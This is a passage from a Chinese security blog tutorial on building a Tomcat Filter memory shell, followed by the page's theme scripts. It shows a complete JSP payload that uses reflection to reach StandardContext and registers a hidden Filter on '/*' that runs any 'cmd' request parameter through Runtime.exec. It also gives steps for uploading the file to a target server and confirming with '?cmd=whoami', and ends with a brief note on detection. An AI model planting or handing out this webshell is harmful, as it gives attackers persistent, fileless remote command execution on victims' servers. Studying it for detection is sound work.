class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步：定义恶意 Filter</span></span><br><span class="line"><span class="type">Filter</span> <span class="variable">maliciousFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">            response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三步：注册 FilterDef</span></span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(maliciousFilter.getClass().getName());</span><br><span class="line">filterDef.setFilter(maliciousFilter);</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四步：注册 FilterMap</span></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第五步：强制写入 filterConfigs</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = </span><br><span class="line">    (HashMap&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line">Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class</span><br><span class="line">    .getDeclaredConstructor(StandardContext.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> </span><br><span class="line">    (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;evil&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">out.println(<span class="string">&quot;Filter 内存马注入成功！&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>验证步骤</strong>：</p>
+<ol>
+<li>将上述 JSP 文件上传到目标服务器的 Web 目录（如 <code>webapps/ROOT/</code>）</li>
+<li>访问该 JSP 文件，看到 “Filter 内存马注入成功！”</li>
+<li>访问任意页面并带上 <code>?cmd=whoami</code> 参数，例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/?cmd=whoami</span><br></pre></td></tr></table></figure></li>
+<li>如果成功，页面会显示命令执行结果</li>
+</ol>
+<hr>
+<h2 id="五、总结：内存马的本质"><a href="#五、总结：内存马的本质" class="headerlink" title="五、总结：内存马的本质"></a>五、总结：内存马的本质</h2><p><strong>内存马的核心思想</strong>：</p>
+<ul>
+<li><strong>不落地</strong>：不写入文件系统，只存在于 JVM 内存中</li>
+<li><strong>动态注册</strong>：绕过 web.xml 和注解，直接操作 Tomcat 内部数据结构</li>
+<li><strong>隐蔽持久</strong>：只要 Tomcat 不重启，内存马就一直存在</li>
+</ul>
+<p><strong>Filter 内存马的关键点</strong>：</p>
+<ol>
+<li>必须拿到 StandardContext 对象（通过反射）</li>
+<li>必须同时注入三个数据结构：filterDefs、filterMaps、filterConfigs</li>
+<li>必须手动创建 ApplicationFilterConfig（因为错过了启动阶段）</li>
+<li>使用 <code>addFilterMapBefore</code> 确保优先拦截</li>
+</ol>
+<p><strong>防御检测</strong>：</p>
+<p>从防御视角来看，检测内存马通常需要扫描 JVM 内存中的 Filter 列表，对比是否存在未在 web.xml 或注解中声明的 Filter，或者利用 Java Agent 在运行时对 Tomcat 内部数据结构的修改进行监控。</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Filter-%E2%80%94%E2%80%94-Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8E%E9%9B%B6%E5%88%B0%E6%B3%A8%E5%85%A5"><span class="toc-text">代码审计 | Filter —— Tomcat 内存马从零到注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">一、快速搭建环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE"><span class="toc-text">创建项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5-Tomcat-%E4%BE%9D%E8%B5%96"><span class="toc-text">导入 Tomcat 依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%83%AD%E5%8A%A0%E8%BD%BD"><span class="toc-text">配置热加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%90%AF%E5%8A%A8"><span class="toc-text">直接启动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Filter-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%AD%A3%E5%B8%B8%E6%80%8E%E4%B9%88%E7%94%A8"><span class="toc-text">二、Filter 是什么，正常怎么用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A"><span class="toc-text">代码解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-xml-%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%86%8C-Filter"><span class="toc-text">web.xml 方式注册 Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E9%9D%99%E6%80%81%E6%B3%A8%E5%86%8C%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94"><span class="toc-text">两种静态注册方式对比</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81StandardContext-%E4%B8%AD%E7%9A%84%E4%B8%89%E4%B8%AA%E6%A0%B8%E5%BF%83-Filter-%E9%9B%86%E5%90%88"><span class="toc-text">三、StandardContext 中的三个核心 Filter 集合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-filterDefs-%E2%80%94%E2%80%94-Filter-%E5%AE%9A%E4%B9%89%E5%BA%93"><span class="toc-text">1. filterDefs —— Filter 定义库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-filterMaps-%E2%80%94%E2%80%94-Filter-%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="toc-text">2. filterMaps —— Filter 路由表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-filterConfigs-%E2%80%94%E2%80%94-%E8%BF%90%E8%A1%8C%E6%97%B6%E9%85%8D%E7%BD%AE%E7%BC%93%E5%AD%98"><span class="toc-text">3. filterConfigs —— 运行时配置缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E8%80%85%E7%9A%84%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">三者的协作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%85%B3%E9%94%AE%E6%84%8F%E4%B9%89"><span class="toc-text">对内存马的关键意义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%EF%BC%9A%E7%BB%95%E8%BF%87-web-xml-%E6%B3%A8%E5%85%A5-Filter-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">四、动态注册：绕过 web.xml 注入 Filter 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%8B%BF%E5%88%B0-StandardContext%EF%BC%88%E5%8F%8D%E5%B0%84%E6%8C%96%E6%8E%98%EF%BC%89"><span class="toc-text">第一步：拿到 StandardContext（反射挖掘）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%AE%9A%E4%B9%89%E6%81%B6%E6%84%8F-Filter%EF%BC%88%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB%EF%BC%89"><span class="toc-text">第二步：定义恶意 Filter（匿名内部类）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%86%8C-FilterDef%EF%BC%88%E5%8A%A0%E5%85%A5%E6%A1%A3%E6%A1%88%E6%9F%9C%EF%BC%89"><span class="toc-text">第三步：注册 FilterDef（加入档案柜）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%86%8C-FilterMap%EF%BC%88%E5%8A%A0%E5%85%A5%E6%8E%92%E7%8F%AD%E8%A1%A8%EF%BC%89"><span class="toc-text">第四步：注册 FilterMap（加入排班表）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%88%E5%85%B3%E9%94%AE%EF%BC%89%EF%BC%9A%E5%BC%BA%E5%88%B6%E5%86%99%E5%85%A5-filterConfigs"><span class="toc-text">第五步（关键）：强制写入 filterConfigs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%B3%A8%E5%85%A5-JSP-%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">完整注入 JSP 与验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93%EF%BC%9A%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-text">五、总结：内存马的本质</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
